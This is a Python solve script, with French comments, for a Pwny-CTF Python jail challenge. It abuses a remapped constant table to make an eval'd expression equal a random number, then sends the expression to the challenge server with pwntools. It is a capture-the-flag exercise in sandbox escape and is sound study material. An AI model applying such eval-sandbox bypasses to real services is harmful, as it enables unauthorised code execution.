#!/usr/bin/env python3
# Tricky Magic Trick (Pwny-CTF, Jail, Python 3.11)
#
#   num = random.randint(100,1000)        # ... mais il est IMPRIME ("Oops I dropped my card! N")
#   answer = compile(guess,"","eval").replace(co_consts=tuple(range(0,1001)), co_names=())
#   if eval(answer, {"__builtins__": {}}) == num: flag
#
# compile() remplace la table des constantes par range(0,1001) et vide co_names.
# Donc : plus de noms/attributs utilisables, et chaque LOAD_CONST d'index i
# charge desormais la valeur i (co_consts[i]=i). Il faut donc une expression
# dont le resultat = num, en controlant quel INDICE de constante est charge.
#
# Idee : il faut amener un litteral a l'index 'num'. Une chaine de comparaisons
#   0<1<2<...<(num-1)  n'est PAS repliee et emet un LOAD_CONST par entier
# -> num constantes distinctes (index 0..num-1), et la chaine vaut True.
#   ... and {0:num}[0]
# le litteral 'num' est la (num+1)e constante distincte -> index num -> apres
# remap il vaut num. {0:num}[0] = num. True and num = num.  => eval == num.
from pwn import *
import re

def make(num):
    chain = "<".join(str(i) for i in range(num))      # 0<1<...<(num-1)  (toujours vrai)
    return chain + " and {0:" + str(num) + "}[0]"

io = remote("chal.sigpwny.com", 7007)
line = io.recvline_contains(b"dropped my card")
num = int(re.search(rb"(\d+)", line).group(1))
log.success(f"num = {num}")

io.sendlineafter(b"guess what number my card has on it: ", make(num).encode())
print(io.recvall(timeout=5).decode(errors="replace"))
